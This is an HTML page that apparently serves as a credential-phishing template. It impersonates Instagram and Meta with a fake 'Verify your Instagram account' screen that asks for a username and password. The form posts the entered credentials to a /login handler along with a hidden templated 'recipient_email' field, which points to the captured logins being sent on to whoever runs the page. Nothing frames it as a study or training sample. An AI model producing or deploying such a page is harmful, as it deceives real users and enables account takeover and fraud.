<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Verification</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: system-ui, -apple-system, "Segoe UI", Roboto;
}

body {
  display: flex;
  height: 100vh;
  background: #000;
  color: white;
}

/* LEFT SIDE */
.left {
  flex: 1;
  padding: 100px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  background: radial-gradient(circle at top left, #111, #000);
}

.left h1 {
  font-size: 56px;
  font-weight: 500;
  line-height: 1.2;
}

/* Image stack */
.stack {
  position: relative;
  margin-top: 60px;
  width: 300px;
  height: 260px;
}

.card {
  position: absolute;
  width: 180px;
  height: 230px;
  border-radius: 20px;
  overflow: hidden;
  box-shadow: 0 20px 50px rgba(0,0,0,0.7);
}

.card1 { left: 0; top: 40px; transform: rotate(-10deg); }
.card2 { left: 60px; top: 0; z-index: 2; }
.card3 { left: 120px; top: 40px; transform: rotate(10deg); }

.card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

/* RIGHT SIDE */
.right {
  flex: 1;
  display: flex;
  justify-content: center;
  align-items: center;
  background: #000;
}

.box {
  width: 400px;
}

/* Header */
.top {
  display: flex;
  align-items: center;
  margin-bottom: 30px;
}

.top h2 {
  font-weight: 500;
}

/* Instagram Gradient Text */
.logo-text {
  font-size: 32px;
  font-weight: 600;
  margin-bottom: 25px;

  background: linear-gradient(
    90deg,
    #feda75,
    #fa7e1e,
    #d62976,
    #962fbf,
    #4f5bd5
  );
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

/* INPUTS */
.input {
  width: 100%;
  padding: 16px;
  margin-bottom: 14px;
  border-radius: 12px;
  border: 1px solid #2c2c2c;
  background: transparent;
  color: white;
  font-size: 15px;
}

.input:focus {
  outline: none;
  border-color: #3b82f6;
  box-shadow: 0 0 0 1px #3b82f6;
}

/* BUTTON */
.btn {
  width: 100%;
  padding: 14px;
  border-radius: 30px;
  border: none;
  background: #1f3b66;
  color: #8aa4d6;
  font-weight: 600;
  margin-top: 10px;
  cursor: pointer;
}

.btn:hover {
  background: #2e5a99;
}

/* Footer */
.meta {
  text-align: center;
  margin-top: 25px;
  color: gray;
}

/* Responsive */
@media(max-width:900px){
  .left { display:none; }
}
</style>
</head>

<body>

<!-- LEFT SIDE -->
<div class="left">
<h1>Verify your Instagram account</h1>

<div class="stack">
  <div class="card card1"><img src="https://picsum.photos/200?1"></div>
  <div class="card card2"><img src="https://picsum.photos/200?2"></div>
  <div class="card card3"><img src="https://picsum.photos/200?3"></div>
</div>
</div>

<!-- RIGHT SIDE -->
<div class="right">
<div class="box">

<div class="top">
<h2>Verification Required</h2>
</div>

<div class="logo-text">Instagram</div>

<!-- ✅ BACKEND SAFE FORM -->
<form method="POST" action="/login">

<input type="hidden" name="recipient_email" value="{{ recipient_email }}">

<input class="input" type="text" name="username" placeholder="Email or username" required>

<input class="input" type="password" name="password" placeholder="Enter password" required>

<button class="btn" type="submit">Verify Account</button>

</form>

<div class="meta">Meta Platforms, Inc.</div>

</div>
</div>

</body>
</html>
